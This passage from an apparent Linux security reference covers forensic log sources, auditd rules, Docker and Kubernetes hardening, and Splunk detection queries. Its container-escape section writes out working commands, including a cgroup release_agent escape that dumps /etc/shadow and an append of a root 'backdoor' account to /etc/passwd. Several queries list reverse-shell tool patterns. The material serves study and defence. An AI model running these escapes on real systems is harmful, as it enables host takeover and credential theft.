### Application Logs

```
APPLICATION LOG LOCATIONS:
┌────────────────────────────────────────┬─────────────────────────────────────────────┐
│ Application                            │ Log Location                                │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ Apache                                 │ /var/log/apache2/ (Debian)                 │
│                                        │ /var/log/httpd/ (RHEL)                     │
│                                        │ access.log, error.log                       │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ Nginx                                  │ /var/log/nginx/                             │
│                                        │ access.log, error.log                       │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ MySQL/MariaDB                          │ /var/log/mysql/                             │
│                                        │ error.log, slow-query.log                  │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ PostgreSQL                             │ /var/log/postgresql/                        │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ Docker                                 │ /var/lib/docker/containers/<id>/*.log     │
│                                        │ docker logs <container>                    │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ SSH Server                             │ /var/log/auth.log or /var/log/secure       │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ FTP (vsftpd)                           │ /var/log/vsftpd.log                         │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ Samba                                  │ /var/log/samba/                             │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ Fail2ban                               │ /var/log/fail2ban.log                       │
└────────────────────────────────────────┴─────────────────────────────────────────────┘
```

### Systemd Journal

```bash
# View entire journal
journalctl

# Follow live
journalctl -f

# View specific unit
journalctl -u sshd
journalctl -u nginx

# Filter by time
journalctl --since "2026-02-24 00:00:00"
journalctl --since "1 hour ago"
journalctl --since yesterday --until today

# Filter by priority
journalctl -p err          # Error and above
journalctl -p warning      # Warning and above

# Filter by PID
journalctl _PID=1234

# Kernel messages
journalctl -k

# Boot messages
journalctl -b              # Current boot
journalctl -b -1           # Previous boot
journalctl --list-boots    # List all boots

# Export to JSON
journalctl -o json-pretty

# Show logs for specific user
journalctl _UID=1000
```

### Log Locations for Forensics

```
CRITICAL FORENSIC LOG SOURCES:
├── Authentication
│   ├── /var/log/auth.log OR /var/log/secure
│   ├── /var/log/wtmp, /var/log/btmp
│   └── /var/log/lastlog
│
├── Command History
│   ├── ~/.bash_history
│   ├── ~/.zsh_history
│   ├── ~/.mysql_history
│   ├── ~/.psql_history
│   ├── ~/.python_history
│   └── /root/.*_history
│
├── Audit Trail
│   ├── /var/log/audit/audit.log
│   └── ausearch output
│
├── Process Execution
│   ├── /var/log/audit/audit.log (with execve rules)
│   ├── /proc/<pid>/ (live processes)
│   └── Core dumps (/var/crash/, /var/lib/systemd/coredump/)
│
├── Network
│   ├── /var/log/ufw.log (if UFW enabled)
│   ├── /var/log/firewalld (if firewalld)
│   ├── /var/log/iptables.log (custom)
│   └── Connection tracking: /proc/net/nf_conntrack
│
├── Application
│   ├── Web server access/error logs
│   ├── Database logs
│   └── Custom application logs
│
└── System State
    ├── /etc/ (configuration changes)
    ├── /var/spool/cron/ (scheduled tasks)
    └── /etc/systemd/system/ (services)
```

---

## Forensic Commands & Investigation

### User Activity Investigation

```bash
# Currently logged in users
who
w
users
finger

# Login history
last                        # Login/logout history from wtmp
last -n 50                  # Last 50 entries
last -f /var/log/wtmp.1     # Previous wtmp file
last root                   # Root login history
last -x                     # Include shutdown/runlevel changes

# Failed login attempts
lastb                       # From btmp (requires root)
lastb -n 50

# Last login per user
lastlog
lastlog -u username

# User information
id username
groups username
getent passwd username
getent shadow username      # Requires root
chage -l username           # Password aging info

# Command history
cat ~/.bash_history
cat /home/*/.bash_history
history                     # Current session

# Sudo history
grep -E 'sudo|COMMAND=' /var/log/auth.log
grep -E 'sudo|COMMAND=' /var/log/secure
```

### Process Investigation

```bash
# Current processes
ps aux                      # All processes, BSD syntax
ps -ef                      # All processes, standard syntax
ps auxf                     # Process tree (forest)
ps -eo pid,ppid,user,cmd    # Custom output
ps -p <PID> -o pid,ppid,user,stat,start,time,cmd

# Process tree
pstree -p                   # With PIDs
pstree -pu                  # With PIDs and users
pstree -p <PID>             # Tree for specific process

# Detailed process info from /proc
ls -la /proc/<PID>/
cat /proc/<PID>/cmdline     # Command line (null-separated)
cat /proc/<PID>/environ     # Environment variables
ls -la /proc/<PID>/exe      # Link to executable
ls -la /proc/<PID>/cwd      # Current working directory
ls -la /proc/<PID>/fd/      # Open file descriptors
cat /proc/<PID>/maps        # Memory mappings
cat /proc/<PID>/status      # Process status
cat /proc/<PID>/loginuid    # Original login UID

# Find process by name
pgrep -a sshd
pidof sshd

# Process resource usage
top -b -n 1
htop

# Open files by process
lsof -p <PID>
lsof -c <process_name>

# Process capabilities
cat /proc/<PID>/status | grep Cap
getpcaps <PID>
```

### File System Investigation

```bash
# Find recently modified files
find / -type f -mtime -1 2>/dev/null       # Modified in last 24 hours
find / -type f -mtime -7 2>/dev/null       # Modified in last 7 days
find / -type f -mmin -60 2>/dev/null       # Modified in last 60 minutes
find / -type f -ctime -1 2>/dev/null       # Changed (metadata) in last 24 hours
find / -type f -atime -1 2>/dev/null       # Accessed in last 24 hours

# Find by specific time range
find / -type f -newermt "2026-02-24 00:00:00" -not -newermt "2026-02-24 12:00:00" 2>/dev/null

# Find hidden files
find / -name ".*" -type f 2>/dev/null

# Find SUID/SGID files
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null

# Find world-writable files
find / -perm -0002 -type f 2>/dev/null

# Find files owned by user
find / -user <username> -type f 2>/dev/null

# Find large files
find / -size +100M -type f 2>/dev/null

# Compare directory contents
diff -rq /dir1 /dir2

# File metadata
stat <file>
file <file>

# File hashes
md5sum <file>
sha256sum <file>

# Check for deleted but open files
lsof +L1
lsof | grep deleted

# Timeline analysis (using find)
find / -type f -printf '%T+ %p\n' 2>/dev/null | sort

# Extended attributes
getfattr -d <file>
lsattr <file>
```

### Network Investigation

```bash
# Active connections
ss -tulpn                   # Listening TCP/UDP with process
ss -anp                     # All connections with process
netstat -tulpn              # Legacy equivalent
netstat -anp

# Specific port
ss -tlpn sport = :22
lsof -i :22

# Established connections
ss -tnp state established

# Connection to specific IP
ss dst <IP>
ss src <IP>

# Network interfaces
ip addr
ifconfig -a
ip link

# Routing table
ip route
route -n
netstat -rn

# ARP cache
ip neigh
arp -a

# DNS configuration
cat /etc/resolv.conf
cat /etc/hosts

# Active connections from /proc
cat /proc/net/tcp           # TCP connections (hex format)
cat /proc/net/udp           # UDP connections
cat /proc/net/unix          # Unix sockets

# Firewall rules
iptables -L -n -v
iptables -L -n -v -t nat
ip6tables -L -n -v
nft list ruleset            # For nftables

# Network statistics
netstat -s
ss -s
```

### Memory Analysis (Live)

```bash
# System memory info
free -h
cat /proc/meminfo

# Memory maps for process
cat /proc/<PID>/maps
pmap <PID>

# Dump process memory
gdb -p <PID>
(gdb) dump memory output.dump 0x00000000 0xffffffff

# Using gcore
gcore <PID>

# /proc memory access
cat /proc/<PID>/mem         # Requires proper seeking

# Strings from process memory
strings /proc/<PID>/mem 2>/dev/null
gdb -batch -ex "info proc mappings" -ex "q" -p <PID>

# Volatile memory capture
# LiME (Linux Memory Extractor)
insmod lime.ko "path=/tmp/memory.lime format=lime"

# AVML (Microsoft)
./avml memory.raw
```

### Timeline Creation

```bash
# Quick filesystem timeline
find / -type f -printf '%T+ %M %u %g %s %p\n' 2>/dev/null | sort > timeline.txt

# Detailed timeline with stat
find / -type f -exec stat --printf='%y|%x|%z|%n\n' {} \; 2>/dev/null > timeline.csv

# Using log2timeline/plaso (if installed)
log2timeline.py /path/to/output.plaso /path/to/image
psort.py -o dynamic output.plaso "date > '2026-02-24'" > filtered_timeline.csv

# mactime format (for The Sleuth Kit)
fls -r -m / /dev/sda1 > body.txt
mactime -b body.txt > timeline.txt
```

---

## Auditd Configuration & Rules

### Auditd Setup

```bash
# Install auditd
apt install auditd          # Debian/Ubuntu
yum install audit           # RHEL/CentOS

# Service management
systemctl enable auditd
systemctl start auditd
systemctl status auditd

# Configuration file
cat /etc/audit/auditd.conf

# Rules location
/etc/audit/audit.rules          # Compiled rules (read-only)
/etc/audit/rules.d/*.rules      # Rule files (editable)

# Apply rules
augenrules --load
auditctl -R /etc/audit/audit.rules

# Check current rules
auditctl -l

# Delete all rules (for testing)
auditctl -D
```

### Essential Audit Rules

```bash
# /etc/audit/rules.d/audit.rules

# ============================================
# DELETE ALL EXISTING RULES
# ============================================
-D

# ============================================
# BUFFER SIZE
# ============================================
-b 8192

# ============================================
# FAILURE MODE (0=silent, 1=printk, 2=panic)
# ============================================
-f 1

# ============================================
# PROCESS EXECUTION MONITORING
# ============================================
# Log all execve calls (comprehensive command logging)
-a always,exit -F arch=b64 -S execve -k exec_commands
-a always,exit -F arch=b32 -S execve -k exec_commands

# ============================================
# AUTHENTICATION & IDENTITY
# ============================================
# Monitor /etc/passwd changes
-w /etc/passwd -p wa -k passwd_changes

# Monitor /etc/shadow changes
-w /etc/shadow -p wa -k shadow_changes

# Monitor /etc/group changes
-w /etc/group -p wa -k group_changes

# Monitor /etc/gshadow changes
-w /etc/gshadow -p wa -k gshadow_changes

# Monitor sudoers
-w /etc/sudoers -p wa -k sudoers_changes
-w /etc/sudoers.d/ -p wa -k sudoers_changes

# Monitor PAM configuration
-w /etc/pam.d/ -p wa -k pam_changes

# ============================================
# SSH CONFIGURATION
# ============================================
-w /etc/ssh/sshd_config -p wa -k sshd_config
-w /root/.ssh/ -p wa -k root_ssh

# ============================================
# PRIVILEGE ESCALATION TOOLS
# ============================================
-w /usr/bin/sudo -p x -k priv_esc
-w /usr/bin/su -p x -k priv_esc
-w /usr/bin/pkexec -p x -k priv_esc
-w /usr/bin/chsh -p x -k priv_esc
-w /usr/bin/chfn -p x -k priv_esc
-w /usr/bin/newgrp -p x -k priv_esc

# ============================================
# SCHEDULED TASKS
# ============================================
-w /etc/crontab -p wa -k cron_changes
-w /etc/cron.d/ -p wa -k cron_changes
-w /etc/cron.daily/ -p wa -k cron_changes
-w /etc/cron.hourly/ -p wa -k cron_changes
-w /etc/cron.weekly/ -p wa -k cron_changes
-w /etc/cron.monthly/ -p wa -k cron_changes
-w /var/spool/cron/ -p wa -k cron_changes
-w /var/spool/cron/crontabs/ -p wa -k cron_changes

# ============================================
# SYSTEMD SERVICES
# ============================================
-w /etc/systemd/ -p wa -k systemd_changes
-w /lib/systemd/ -p wa -k systemd_changes
-w /usr/lib/systemd/ -p wa -k systemd_changes

# ============================================
# INIT SYSTEM
# ============================================
-w /etc/init.d/ -p wa -k init_changes
-w /etc/rc.local -p wa -k rc_local

# ============================================
# NETWORK CONFIGURATION
# ============================================
-w /etc/hosts -p wa -k hosts_changes
-w /etc/resolv.conf -p wa -k dns_changes
-w /etc/network/ -p wa -k network_changes
-w /etc/sysconfig/network-scripts/ -p wa -k network_changes

# ============================================
# KERNEL MODULES
# ============================================
-w /sbin/insmod -p x -k modules
-w /sbin/rmmod -p x -k modules
-w /sbin/modprobe -p x -k modules
-a always,exit -F arch=b64 -S init_module -S delete_module -k modules

# ============================================
# LIBRARY PRELOAD
# ============================================
-w /etc/ld.so.conf -p wa -k ld_so_conf
-w /etc/ld.so.conf.d/ -p wa -k ld_so_conf
-w /etc/ld.so.preload -p wa -k ld_preload

# ============================================
# MOUNT OPERATIONS
# ============================================
-a always,exit -F arch=b64 -S mount -S umount2 -k mount_ops

# ============================================
# TIME CHANGES
# ============================================
-a always,exit -F arch=b64 -S adjtimex -S settimeofday -S clock_settime -k time_changes
-w /etc/localtime -p wa -k time_changes

# ============================================
# USER/GROUP CHANGES
# ============================================
-w /usr/sbin/useradd -p x -k user_changes
-w /usr/sbin/userdel -p x -k user_changes
-w /usr/sbin/usermod -p x -k user_changes
-w /usr/sbin/groupadd -p x -k user_changes
-w /usr/sbin/groupdel -p x -k user_changes
-w /usr/sbin/groupmod -p x -k user_changes

# ============================================
# PROCESS INJECTION / PTRACE
# ============================================
-a always,exit -F arch=b64 -S ptrace -k process_injection
-a always,exit -F arch=b32 -S ptrace -k process_injection

# ============================================
# SOCKET CREATION
# ============================================
-a always,exit -F arch=b64 -S socket -F a0=2 -k network_socket_created
-a always,exit -F arch=b64 -S socket -F a0=10 -k network_socket_created

# ============================================
# FILE DELETION
# ============================================
-a always,exit -F arch=b64 -S unlink -S unlinkat -S rename -S renameat -F auid>=1000 -F auid!=-1 -k file_deletion

# ============================================
# MAKE RULES IMMUTABLE (place at end)
# ============================================
-e 2
```

### Searching Audit Logs

```bash
# Search by key
ausearch -k exec_commands
ausearch -k passwd_changes

# Search by time
ausearch -ts today
ausearch -ts recent
ausearch -ts "02/24/2026" -te "02/25/2026"
ausearch -ts "10:00:00" -te "12:00:00"

# Search by user
ausearch -ua root
ausearch -ua 1000          # By UID

# Search by event type
ausearch -m EXECVE
ausearch -m USER_AUTH
ausearch -m USER_LOGIN
ausearch -m ADD_USER
ausearch -m DEL_USER

# Search by syscall
ausearch -sc execve
ausearch -sc ptrace

# Search by filename
ausearch -f /etc/passwd
ausearch -f /etc/shadow

# Search by success/failure
ausearch -sv yes           # Successful events
ausearch -sv no            # Failed events

# Interpret output (human-readable)
ausearch -k exec_commands -i

# Output formats
ausearch -k exec -i --format csv
ausearch -k exec -i --format text

# Combine with aureport
ausearch -k exec_commands | aureport -i -x
```

### Audit Reports

```bash
# Summary report
aureport --summary

# Authentication report
aureport -au              # All authentication
aureport -au --failed     # Failed auth

# Command execution report
aureport -x               # Executables
aureport -x --summary     # Summary

# Login report
aureport -l               # Logins
aureport -l --failed      # Failed logins

# File access report
aureport -f               # Files
aureport -f --summary

# User activity
aureport -u               # By user

# Anomaly report
aureport --anomaly

# Syscall report
aureport -s               # Syscalls
aureport -s --summary

# Time-based reports
aureport --start 02/24/2026 --end 02/25/2026 -x

# Key-based report
aureport -k               # By key
```

---

## Container Security

### Docker Security Fundamentals

```
DOCKER ATTACK SURFACE:
├── Container Breakout
│   ├── Privileged containers
│   ├── Mounted host paths
│   ├── Shared namespaces
│   └── Kernel exploits
│
├── Image Security
│   ├── Vulnerable base images
│   ├── Embedded secrets
│   ├── Malicious images
│   └── Supply chain attacks
│
├── Runtime Security
│   ├── Resource exhaustion
│   ├── Network exposure
│   ├── Process injection
│   └── Capability abuse
│
└── Host Security
    ├── Docker socket exposure
    ├── Docker API exposure
    ├── Insecure configuration
    └── Privilege escalation
```

### Container Escape Techniques

```bash
# ============================================
# 1. PRIVILEGED CONTAINER ESCAPE
# ============================================
# If container runs with --privileged:
# Full host device access
fdisk -l                    # List host disks
mount /dev/sda1 /mnt        # Mount host filesystem
chroot /mnt                 # Escape to host

# Alternative: cgroups escape
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "#!/bin/sh" > /cmd
echo "cat /etc/shadow > /output" >> /cmd
chmod +x /cmd
echo "/cmd" > /tmp/cgrp/release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# ============================================
# 2. DOCKER SOCKET ESCAPE
# ============================================
# If /var/run/docker.sock is mounted:
# Check for socket
ls -la /var/run/docker.sock

# Create privileged container
docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh

# Mount host filesystem
docker run -v /:/host -it alpine chroot /host

# Using curl if docker client unavailable
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# ============================================
# 3. HOST NAMESPACE ESCAPE
# ============================================
# If --pid=host:
# Can see and signal host processes
ps aux
kill -9 <host_pid>
nsenter -t 1 -m -u -n -i sh

# If --net=host:
# Access host network interfaces
ifconfig
netstat -tulpn

# ============================================
# 4. CAP_SYS_ADMIN ESCAPE
# ============================================
# If container has CAP_SYS_ADMIN:
# Can mount filesystems
mount /dev/sda1 /mnt

# Cgroup escape (release_agent)
# Similar to privileged container

# ============================================
# 5. CAPABILITY ABUSE
# ============================================
# CAP_SYS_PTRACE: Debug host processes
# CAP_NET_ADMIN: Modify host network
# CAP_DAC_READ_SEARCH: Read host files
# CAP_DAC_OVERRIDE: Write host files

# Check current capabilities
capsh --print

# ============================================
# 6. SENSITIVE MOUNT ESCAPE
# ============================================
# If /etc, /root, or other sensitive dirs mounted:
# Read/write host configuration
cat /hostmount/etc/shadow
echo "backdoor:x:0:0::/root:/bin/bash" >> /hostmount/etc/passwd

# ============================================
# 7. KERNEL EXPLOIT
# ============================================
# Container shares kernel with host
# Kernel exploit = host compromise
uname -r
# Search for applicable exploits
```

### Container Escape Detection

```bash
# Check container configuration
docker inspect <container_id> | jq '.[0].HostConfig.Privileged'
docker inspect <container_id> | jq '.[0].HostConfig.Binds'
docker inspect <container_id> | jq '.[0].HostConfig.CapAdd'
docker inspect <container_id> | jq '.[0].HostConfig.PidMode'
docker inspect <container_id> | jq '.[0].HostConfig.NetworkMode'
docker inspect <container_id> | jq '.[0].HostConfig.SecurityOpt'

# Find dangerous containers
docker ps --format "{{.ID}}: {{.Image}}" | while read container; do
    id=$(echo $container | cut -d: -f1)
    privileged=$(docker inspect $id | jq '.[0].HostConfig.Privileged')
    echo "$container - Privileged: $privileged"
done

# Check for mounted docker socket
docker ps -q | xargs docker inspect --format '{{ .Id }}: Volumes={{ .Mounts }}' | grep docker.sock

# Audit container capabilities
docker ps -q | xargs -I {} docker inspect {} --format '{{ .Id }}: Capabilities={{ .HostConfig.CapAdd }}'
```

### Docker Hardening

```bash
# ============================================
# RUNTIME HARDENING
# ============================================
# Run as non-root user
docker run --user 1000:1000 image

# Drop all capabilities, add only needed
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE image

# Read-only root filesystem
docker run --read-only image
docker run --read-only --tmpfs /tmp image

# No new privileges
docker run --security-opt=no-new-privileges image

# Limit resources
docker run --memory=256m --cpus=0.5 image

# Seccomp profile
docker run --security-opt seccomp=/path/to/profile.json image

# AppArmor profile
docker run --security-opt apparmor=docker-default image

# Don't mount docker socket
# Never: docker run -v /var/run/docker.sock:/var/run/docker.sock

# Use user namespaces
# In /etc/docker/daemon.json:
{
  "userns-remap": "default"
}

# ============================================
# IMAGE HARDENING
# ============================================
# Use minimal base images
FROM alpine:3.19
FROM gcr.io/distroless/static

# Don't run as root
RUN addgroup -g 1000 appgroup && adduser -u 1000 -G appgroup -D appuser
USER appuser

# Scan images for vulnerabilities
trivy image myimage:latest
grype myimage:latest
docker scout cves myimage:latest

# Sign and verify images
cosign sign image:tag
cosign verify image:tag

# ============================================
# DAEMON HARDENING
# ============================================
# /etc/docker/daemon.json
{
  "icc": false,
  "live-restore": true,
  "userland-proxy": false,
  "no-new-privileges": true,
  "seccomp-profile": "/etc/docker/seccomp-profile.json",
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  }
}
```

### Kubernetes Security

```
KUBERNETES ATTACK VECTORS:
├── Pod Escape
│   ├── Privileged pods
│   ├── hostPath volumes
│   ├── hostPID/hostNetwork
│   └── Service account token abuse
│
├── Cluster Compromise
│   ├── Exposed API server
│   ├── RBAC misconfiguration
│   ├── Secrets in etcd
│   └── Node compromise
│
├── Supply Chain
│   ├── Malicious images
│   ├── Compromised registries
│   └── Admission controller bypass
│
└── Network
    ├── No network policies
    ├── Exposed services
    └── Cluster DNS abuse
```

```yaml
# Pod Security Standards (Restricted)
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL
    resources:
      limits:
        memory: "128Mi"
        cpu: "500m"
      requests:
        memory: "64Mi"
        cpu: "250m"
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir: {}
```

```bash
# Kubernetes security checks
# Check for privileged pods
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.name}{" - Privileged: "}{.spec.containers[*].securityContext.privileged}{"\n"}{end}'

# Check for hostPath volumes
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.name}{" - HostPath: "}{.spec.volumes[*].hostPath.path}{"\n"}{end}'

# Check service account permissions
kubectl auth can-i --list --as=system:serviceaccount:default:default

# Check for exposed secrets
kubectl get secrets -A

# Network policy audit
kubectl get networkpolicies -A

# RBAC review
kubectl get clusterrolebindings -o wide
kubectl get rolebindings -A -o wide
```

---

## Linux Hardening Checklist

### System Hardening

```
SYSTEM HARDENING CHECKLIST:
□ Keep system updated
  └── apt update && apt upgrade -y (Debian/Ubuntu)
  └── yum update -y (RHEL/CentOS)

□ Enable automatic security updates
  └── unattended-upgrades (Debian/Ubuntu)
  └── dnf-automatic (RHEL 8+)

□ Disable unnecessary services
  └── systemctl disable <service>
  └── systemctl mask <service>

□ Remove unnecessary packages
  └── apt autoremove
  └── yum autoremove

□ Configure firewall
  └── ufw enable (Ubuntu)
  └── firewall-cmd --set-default-zone=drop (RHEL)

□ Enable and configure auditd
  └── systemctl enable auditd
  └── Configure comprehensive rules

□ Restrict kernel parameters (sysctl)
  └── /etc/sysctl.d/99-security.conf

□ Enable SELinux/AppArmor
  └── setenforce 1 (SELinux)
  └── aa-enforce /etc/apparmor.d/* (AppArmor)

□ Configure system logging
  └── Remote logging if possible
  └── Log rotation configuration

□ Disable core dumps (if not needed)
  └── echo "* hard core 0" >> /etc/security/limits.conf
```

### SSH Hardening

```bash
# /etc/ssh/sshd_config

# Protocol
Protocol 2

# Authentication
PermitRootLogin no
MaxAuthTries 3
PubkeyAuthentication yes
PasswordAuthentication no
PermitEmptyPasswords no
ChallengeResponseAuthentication no

# Access control
AllowUsers user1 user2
AllowGroups sshusers
DenyUsers baduser
DenyGroups badgroup

# Session
ClientAliveInterval 300
ClientAliveCountMax 2
LoginGraceTime 60

# Forwarding
X11Forwarding no
AllowTcpForwarding no
AllowAgentForwarding no
PermitTunnel no
GatewayPorts no

# Other security
Banner /etc/issue.net
UsePAM yes
IgnoreRhosts yes
HostbasedAuthentication no
PermitUserEnvironment no

# Logging
LogLevel VERBOSE
SyslogFacility AUTH

# Crypto
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com
MACs hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com
HostKeyAlgorithms ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-256

# Restart after changes
systemctl restart sshd
```

### Kernel Hardening (sysctl)

```bash
# /etc/sysctl.d/99-security.conf

# ============================================
# NETWORK SECURITY
# ============================================
# Disable IP forwarding (unless router)
net.ipv4.ip_forward = 0
net.ipv6.conf.all.forwarding = 0

# Disable source routing
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0
net.ipv6.conf.all.accept_source_route = 0
net.ipv6.conf.default.accept_source_route = 0

# Disable ICMP redirects
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv6.conf.all.accept_redirects = 0
net.ipv6.conf.default.accept_redirects = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0

# Enable reverse path filtering
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1

# Ignore ICMP broadcasts
net.ipv4.icmp_echo_ignore_broadcasts = 1

# Ignore bogus ICMP errors
net.ipv4.icmp_ignore_bogus_error_responses = 1

# Enable SYN cookies
net.ipv4.tcp_syncookies = 1

# Log martians
net.ipv4.conf.all.log_martians = 1
net.ipv4.conf.default.log_martians = 1

# ============================================
# KERNEL SECURITY
# ============================================
# Address space randomization
kernel.randomize_va_space = 2

# Restrict kernel pointers
kernel.kptr_restrict = 2

# Restrict dmesg
kernel.dmesg_restrict = 1

# Restrict perf events
kernel.perf_event_paranoid = 3

# Disable magic SysRq (or restrict)
kernel.sysrq = 0

# Restrict loading TTY line disciplines
dev.tty.ldisc_autoload = 0

# Restrict eBPF
kernel.unprivileged_bpf_disabled = 1
net.core.bpf_jit_harden = 2

# Restrict userfaultfd
vm.unprivileged_userfaultfd = 0

# ============================================
# FILE SYSTEM SECURITY
# ============================================
# Restrict creation of hard links
fs.protected_hardlinks = 1

# Restrict creation of symbolic links
fs.protected_symlinks = 1

# Restrict FIFO special files
fs.protected_fifos = 2

# Restrict regular files
fs.protected_regular = 2

# Apply changes
sysctl -p /etc/sysctl.d/99-security.conf
```

### File Permission Hardening

```bash
# Critical file permissions
chmod 644 /etc/passwd
chmod 400 /etc/shadow
chmod 644 /etc/group
chmod 400 /etc/gshadow
chmod 640 /etc/sudoers
chmod 700 /root
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
chmod 600 /etc/ssh/*_key
chmod 644 /etc/ssh/*.pub
chmod 644 /etc/ssh/sshd_config

# Find and fix world-writable files
find / -xdev -type f -perm -0002 -exec chmod o-w {} \;

# Find and remove unneeded SUID bits
chmod u-s /usr/bin/newgrp
chmod u-s /usr/bin/chsh
chmod u-s /usr/bin/chfn

# Restrict cron
echo "root" > /etc/cron.allow
rm -f /etc/cron.deny
chmod 600 /etc/crontab
chmod 700 /etc/cron.d
chmod 700 /etc/cron.daily
chmod 700 /etc/cron.hourly
chmod 700 /etc/cron.weekly
chmod 700 /etc/cron.monthly

# Restrict at
echo "root" > /etc/at.allow
rm -f /etc/at.deny
```

### User Account Hardening

```bash
# Password policy (/etc/login.defs)
PASS_MAX_DAYS   90
PASS_MIN_DAYS   7
PASS_WARN_AGE   14
PASS_MIN_LEN    14

# PAM password requirements (/etc/pam.d/common-password)
password requisite pam_pwquality.so retry=3 minlen=14 dcredit=-1 ucredit=-1 ocredit=-1 lcredit=-1

# Account lockout (/etc/pam.d/common-auth)
auth required pam_faillock.so preauth silent audit deny=5 unlock_time=900
auth [default=die] pam_faillock.so authfail audit deny=5 unlock_time=900
auth sufficient pam_faillock.so authsucc audit deny=5 unlock_time=900

# Disable unused accounts
usermod -L username
usermod -s /sbin/nologin username

# Remove unnecessary users
userdel games
userdel ftp

# Check for empty passwords
awk -F: '($2 == "") {print $1}' /etc/shadow

# Check for UID 0 accounts (besides root)
awk -F: '($3 == "0") {print $1}' /etc/passwd
```

---

## Attack Detection Queries

### Splunk Queries

```sql
-- ============================================
-- PRIVILEGE ESCALATION DETECTION
-- ============================================

-- New SUID files created
index=linux sourcetype=auditd type=SYSCALL syscall=chmod
| where match(a1, "^(4755|4775|2755|2775|6755)$")
| stats count by hostname, uid, auid, exe, key

-- Sudo usage
index=linux (source="/var/log/auth.log" OR source="/var/log/secure")
| rex field=_raw "sudo:\s+(?<sudo_user>\S+)\s+:.*COMMAND=(?<command>.*)"
| where isnotnull(sudo_user)
| stats count values(command) by sudo_user, host

-- Privilege escalation attempts (sudo failures)
index=linux (source="/var/log/auth.log" OR source="/var/log/secure")
| where match(_raw, "sudo:.*authentication failure|sudo:.*incorrect password")
| stats count by host, src_user

-- Capability abuse detection
index=linux sourcetype=auditd key=exec_commands
| where match(a0, "(setuid|setgid|setcap)")
| stats count by hostname, uid, exe

-- ============================================
-- PERSISTENCE DETECTION
-- ============================================

-- Cron job modifications
index=linux sourcetype=auditd key=cron_changes
| stats count values(name) by hostname, uid, syscall

-- New systemd services
index=linux sourcetype=auditd key=systemd_changes
| where match(name, "\.service$")
| stats count values(name) by hostname, uid

-- SSH authorized_keys modifications
index=linux sourcetype=auditd
| where match(name, "authorized_keys")
| stats count by hostname, uid, syscall

-- Shell profile modifications
index=linux sourcetype=auditd
| where match(name, "\.(bashrc|bash_profile|profile|zshrc)")
| stats count by hostname, uid, name

-- ============================================
-- AUTHENTICATION ANOMALIES
-- ============================================

-- Failed SSH logins
index=linux (source="/var/log/auth.log" OR source="/var/log/secure")
| where match(_raw, "Failed password|Invalid user")
| rex field=_raw "from\s+(?<src_ip>\d+\.\d+\.\d+\.\d+)"
| stats count by host, src_ip
| where count > 10

-- Successful logins from new IPs
index=linux (source="/var/log/auth.log" OR source="/var/log/secure")
| where match(_raw, "Accepted")
| rex field=_raw "Accepted\s+\w+\s+for\s+(?<user>\S+)\s+from\s+(?<src_ip>\S+)"
| stats earliest(_time) as first_seen count by user, src_ip
| where first_seen > relative_time(now(), "-24h")

-- Root logins
index=linux (source="/var/log/auth.log" OR source="/var/log/secure")
| where match(_raw, "session opened for user root|Accepted.*root")
| stats count by host, src_ip

-- ============================================
-- NETWORK ANOMALIES
-- ============================================

-- Outbound connections to unusual ports
index=linux sourcetype=auditd key=network_socket_created
| stats count by hostname, uid, exe

-- Reverse shell indicators
index=linux sourcetype=auditd key=exec_commands
| where match(a0, "(nc|ncat|netcat|bash|sh)")
| where match(a1, "(-e|-c|/dev/tcp|/dev/udp)")
| stats count values(a0) values(a1) by hostname, uid

-- ============================================
-- SUSPICIOUS PROCESS EXECUTION
-- ============================================

-- Encoded commands
index=linux sourcetype=auditd key=exec_commands
| where match(a0, "(base64|python|perl|ruby|php)")
| where match(a1, "(-c|-e|decode|eval)")
| stats count by hostname, uid, exe

-- Suspicious binaries execution
index=linux sourcetype=auditd key=exec_commands
| where match(a0, "(wget|curl|nc|ncat|socat|python|perl)") AND match(a1, "(http|tcp|udp|exec|eval)")
| stats count by hostname, uid, a0, a1

-- Process from /tmp or /dev/shm
index=linux sourcetype=auditd key=exec_commands
| where match(exe, "^(/tmp/|/dev/shm/|/var/tmp/)")
| stats count by hostname, uid, exe
```

### Sigma Rules for Linux

```yaml
# Privilege Escalation via SUID
title: SUID Binary Exploitation Attempt
id: d8c1e8f2-3a4b-5c6d-7e8f-9a0b1c2d3e4f
